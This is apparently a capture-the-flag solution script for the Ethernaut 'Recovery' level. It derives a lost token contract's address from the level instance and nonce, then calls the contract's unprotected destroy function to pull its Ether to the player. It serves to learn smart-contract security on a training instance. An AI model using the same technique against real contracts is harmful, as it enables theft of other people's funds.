#
#
""" sandbox code... """
#
#

import rlp
from eth_utils import keccak, to_checksum_address, to_bytes
from scripts.helpful_scripts import get_account
from brownie import accounts, config, web3, interface

ETHERNAUT_INSTANCE = "0x0c5193d5b956f34248CfD55F3E5b9f4dcA77421F"


def make_contract_address(sender: str, nonce: int) -> str:
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    hash = keccak(raw)
    address_bytes = hash[12:]
    print(to_checksum_address(address_bytes))
    return to_checksum_address(address_bytes)


def main():
    player = get_account()

    # we need to retrieve address for target contract
    # contract is created at second transaction from main contract
    # hence we set nonce = 1 (2nd transaction)
    simple_token = make_contract_address(ETHERNAUT_INSTANCE, 1)

    print(f"Name: {web3.eth.get_storage_at(simple_token, 0)}")
    print(f"Initial balance: {web3.eth.getBalance(simple_token)}")

    simple = interface.ISimpleToken(simple_token)
    simple.destroy(player, {"from": player})

    print(f"Final balance: {web3.eth.getBalance(simple_token)}")
